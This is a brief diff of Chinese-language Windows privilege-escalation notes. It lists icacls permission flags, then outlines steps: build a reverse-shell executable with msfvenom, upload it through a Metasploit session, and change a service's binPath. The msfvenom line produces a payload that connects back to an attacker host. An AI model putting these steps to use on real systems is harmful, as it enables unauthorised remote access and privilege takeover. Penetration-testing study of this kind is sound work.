@@ -446,11 +446,12 @@ icacls E:\mysql\bin\mysql.exe
 - R - 只读
 - W - 只写
 - D - 删除
-```
-```bash
+
 # 提权步骤
 1. 生成反弹shell
 msfvenom -p windows/shell_reverse_tcp LHOST=ip LPORT=port -f exe > shell.exe
+```
+```bash
 2. 上传文件（msf中执行）
 upload shell.exe
 3. 修改服务binPath
